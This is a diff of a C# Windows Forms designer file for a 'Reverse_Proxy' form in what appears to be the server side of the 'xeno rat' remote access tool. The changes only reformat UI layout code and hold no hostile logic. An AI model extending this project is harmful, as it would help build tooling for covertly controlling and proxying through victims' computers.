@@ -1,5 +1,4 @@
-﻿
-namespace xeno_rat_server.Forms
+﻿namespace xeno_rat_server.Forms
 {
     partial class Reverse_Proxy
     {
@@ -34,7 +33,7 @@ namespace xeno_rat_server.Forms
             this.button1 = new System.Windows.Forms.Button();
             this.button2 = new System.Windows.Forms.Button();
             this.listView1 = new System.Windows.Forms.ListView();
-            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.columnHeader1 = new System.Windows.Forms.ColumnHeader();
             this.SuspendLayout();
             // 
             // textBox1
@@ -76,7 +75,7 @@ namespace xeno_rat_server.Forms
             // listView1
             // 
             this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
-            this.columnHeader1});
+                this.columnHeader1});
             this.listView1.Cursor = System.Windows.Forms.Cursors.Default;
             this.listView1.FullRowSelect = true;
             this.listView1.GridLines = true;
